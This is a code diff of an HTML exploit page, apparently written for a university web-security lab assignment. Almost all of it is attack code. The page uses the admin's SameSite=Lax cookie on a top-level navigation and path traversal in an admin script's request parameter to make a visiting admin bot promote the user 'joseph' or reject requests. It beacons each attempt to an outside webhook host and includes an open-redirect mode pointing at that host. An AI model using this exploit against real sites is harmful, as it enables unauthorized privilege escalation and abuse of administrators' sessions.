@@ -3,34 +3,25 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// v7: external-page delivery of the admin.js path injection.
-// The bot opens this page (proven: D1 + yesterday's beacon). A top-level
-// navigation to the challenge URL carries the admin's SameSite=Lax `sid`
-// cookie (lecture 8: Lax allows cookies on safe-method top-level navigations).
-// admin.js then builds fetch paths from the unvalidated `?request=` param.
-//   ?t=reject7  -> POST api/requests/7/reject  (VISIBLE oracle: request #7
-//                 flips to "rejected" in joseph's own Requests table)
-//   ?t=promote  -> POST api/users/joseph/promote (the win)
-var W = 'https://swift-stream-09.webhook.cool';
+// v8: immediate top-level navigation (no setTimeout — bots may close fast),
+// keepalive beacon (survives page teardown), generic aiming modes.
+// The top-level navigation carries the admin's SameSite=Lax `sid` cookie
+// (lecture 8: Lax permits cookies on safe-method top-level navigations).
+var W    = 'https://swift-stream-09.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
-
-function log(tag) {
-  try { new Image().src = W + '/c1?tag=' + tag + '&t=' + Date.now(); } catch (e) {}
-}
-
-var mode = new URLSearchParams(location.search).get('t') || 'reject7';
-var rid  = new URLSearchParams(location.search).get('r') || '7';
-
+var q    = new URLSearchParams(location.search);
+var mode = q.get('t') || 'reject';
+var rid  = q.get('r') || '7';
 var target;
-if (mode === 'promote') {
-  target = BASE + '?view=admin&request=../users/joseph/promote?/seen';
-  log('nav-promote');
-} else {
-  target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen';
-  log('nav-reject-' + rid);
-}
 
-setTimeout(function () { location.replace(target); }, 400);
+if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
+else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
+else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
+else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fswift-stream-09.webhook.cool%2Foss'; }
+else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
+
+try { fetch(W + '/c1?tag=' + encodeURIComponent(mode + '-' + rid) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
+location.href = target;
 </script>
 </body>
 </html>
